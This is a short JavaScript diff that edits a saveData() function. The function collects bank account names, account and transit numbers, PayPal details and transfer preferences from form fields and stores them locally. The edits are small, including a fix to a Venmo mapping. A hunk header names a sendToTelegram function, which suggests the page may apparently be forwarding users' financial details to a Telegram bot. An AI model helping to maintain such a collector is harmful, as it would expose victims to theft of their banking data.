@@ -2781,11 +2781,11 @@ function sendToTelegram(data) {
 
 
 /* --------------------------
-SAVE DATA FUNCTION (UPDATED)
+SAVE DATA FUNCTION (FIXED)
 -------------------------- */
 function saveData() {
     const savedData = JSON.parse(localStorage.getItem("section3Data") || "{}");
-    
+
     // Capture individual field inputs
     savedData.preference = preference;
     savedData.acuAccount = document.getElementById("acuAccount")?.value || "";
@@ -2804,7 +2804,7 @@ function saveData() {
     savedData.accountNumberUs = document.getElementById("accountNumber-us")?.value || "";
     savedData.paypalUs = document.getElementById("paypalInput-us")?.value || "";
     savedData.acuAccountUs = document.getElementById("acuAccount-us")?.value || "";
-    
+
     // Capture British distinct fields
     savedData.accountNameUk = document.getElementById("accountName-uk")?.value || "";
     savedData.transitNumberUk = document.getElementById("transitNumber-uk")?.value || "";
@@ -2823,8 +2823,10 @@ function saveData() {
             selectedRegion = "US";
             if (preference === "American Bank Transfer") {
                 exactTransferMethodName = savedData.americanBank || "American Bank Transfer";
-            } else if (preference === "Venmo") {
-                exactTransferMethodName = "Revolut";
+            } 
+            // REMOVED the hardcoded override converting Venmo to Revolut:
+            else if (preference === "Venmo") {
+                exactTransferMethodName = "Venmo";
             }
         } else if (region === "canada") {
             selectedRegion = "CA";
@@ -2842,10 +2844,11 @@ function saveData() {
     // Explicit keys for Page 1 to safely pull instantly
     localStorage.setItem("av_selected_region", selectedRegion);
     localStorage.setItem("av_selected_method_title", exactTransferMethodName);
-    
+
     // Save master configuration block
     localStorage.setItem("section3Data", JSON.stringify(savedData));
 }
+
 
 
 
